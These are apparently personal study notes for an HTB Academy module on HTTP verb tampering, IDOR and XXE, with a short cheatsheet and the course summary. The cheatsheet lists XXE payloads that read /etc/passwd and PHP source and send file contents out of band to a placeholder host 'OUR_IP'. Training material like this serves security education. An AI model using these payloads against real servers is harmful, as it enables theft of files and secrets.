# Web Attacks

Tags: #üßë‚Äçüéì
Related to:
See also:
Previous: [[HTB Academy]]

![[logo_web_attacks.png]]

This module covers three common web vulnerabilities, HTTP Verb Tampering, IDOR, and XXE, each of which can have a significant impact on a company's systems. We will cover how to identify, exploit, and prevent each of them through various methods.

### Cheatsheet

#### HTTP Verb Tampering

`HTTP Method`
- `HEAD`
- `PUT`
- `DELETE`
- `OPTIONS`
- `PATCH`

| **Command**   | **Description**   |
| --------------|-------------------|
| `-X OPTIONS` | Set HTTP Method with Curl |

#### IDOR

`Identify IDORS`
- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command**   | **Description**   |
| --------------|-------------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

#### XXE

| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |

### Module Summary

As web applications' popularity keeps increasing, so do the number and types of attacks that web applications are vulnerable to. Many of the most common web attacks have been covered in other web modules already. This module will cover a few other important web exploitation techniques.

The module starts by covering¬†`HTTP Verb Tampering`¬†vulnerabilities that allow attacks to manipulate HTTP requests to access restricted web pages, which may give an attacker access to sensitive resources. The second topic covered is¬†`Insecure Direct Object References (IDOR)`¬†vulnerabilities. IDORs are among the most common vulnerabilities in web applications and allow attackers to easily view and leak other user's private data due to improper access controls. Finally, the module will cover¬†`XML External Entity (XXE) Injection`¬†vulnerabilities. These recently became among the top¬†[10 most critical web vulnerabilities](https://owasp.org/Top10/), as XXE vulnerabilities may allow attackers to read local files stored on the server, gain remote code execution (RCE), or even cause a Denial of Service.

In addition to the above, the¬†`Web Attacks`¬†module will teach you the following:

-   `HTTP Verb Tampering`:
    -   What are HTTP Verb Tampering vulnerabilities?
    -   Examples of insecure configurations
    -   Detecting and exploiting HTTP Verb Tampering vulnerabilities
    -   Examples of secure serve configuration to prevent HTTP Verb Tampering vulnerabilities
-   `IDOR`:
    -   What are IDOR vulnerabilities, and how do they occur
    -   Examples of code vulnerable to IDOR
    -   Different types of IDOR vulnerabilities
    -   How to detect IDOR vulnerabilities
    -   Various methods of exploiting IDOR vulnerabilities
    -   Preventing IDOR vulnerabilities
-   `XXE`:
    -   What are XXE vulnerabilities, and how do they occur
    -   Examples of code vulnerable to XXE
    -   Identifying and exploiting XXE vulnerabilities
    -   Various XXE prevention techniques

* * * * *

This module is broken into sections with accompanying hands-on exercises to practice each of the tactics and techniques we cover. The module ends with a practical hands-on skills assessment to gauge your understanding of the various topic areas.

You can start and stop the module at any time and pick up where you left off. There is no time limit or "grading," but you must complete all of the exercises and the skills assessment to receive the maximum number of cubes and have this module marked as complete in any paths you have chosen.

As you work through the module, you will see example commands and command output for the various topics introduced. It is worth reproducing as many of these examples as possible to reinforce further the concepts presented in each section. You can do this in the¬†`PwnBox`¬†provided in the interactive sections or your virtual machine.

* * * * *

The module is classified as "`Medium`" and assumes a working knowledge of the Linux command line and an understanding of information security fundamentals. The module also assumes a basic understanding of web applications and web requests and will build on this understanding to teach how these vulnerabilities work and how to exploit them.

In addition to the above, a firm grasp of the following modules can be considered as prerequisites for the successful completion of this module:

-   Web Requests
-   Introduction to Web Applications
-   Using Web Proxies
-   Linux Fundamentals
-   Introduction to Bash Scripting